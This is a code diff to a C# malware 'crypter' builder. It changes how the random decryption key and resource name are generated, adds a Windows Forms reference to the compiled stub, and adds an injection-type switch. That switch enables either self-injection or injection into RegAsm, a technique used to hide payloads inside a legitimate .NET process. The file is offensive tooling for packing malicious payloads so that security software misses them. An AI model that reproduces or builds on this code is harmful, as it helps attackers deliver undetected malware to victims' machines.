@@ -21,8 +21,8 @@ namespace _2Simple_Crypter.Builder
         }
         public bool Build()
         {
-            _settings.decryptKey = Randomize.RandomCharacters(10);
-            _settings.resourceName = Randomize.RandomCharacters(10);
+            _settings.decryptKey = Randomize.RandomString(10);
+            _settings.resourceName = Randomize.RandomString(10);
 
             byte[] payload = File.ReadAllBytes(_settings.payloadName);
             
@@ -77,6 +77,7 @@ namespace _2Simple_Crypter.Builder
                     ReferencedAssemblies =
                     {
                         "System.dll",
+                        "System.Windows.Forms.dll"
                     }
                 };
             }
@@ -91,6 +92,7 @@ namespace _2Simple_Crypter.Builder
                     ReferencedAssemblies =
                     {
                         "System.dll",
+                        "System.Windows.Forms.dll"
                     }
                 };
             }
@@ -141,6 +143,17 @@ namespace _2Simple_Crypter.Builder
             {
                 stub = stub.Replace("//#define XOR", "#define XOR");
             }
+
+            // Injection type
+            if(_settings.injectionName == "Itself")
+            {
+                stub = stub.Replace("//#define ITSELF", "#define ITSELF");
+            }
+            else
+            {
+                stub = stub.Replace("//#define REGASM", "#define REGASM");
+            }
+
 
             return stub;
         }
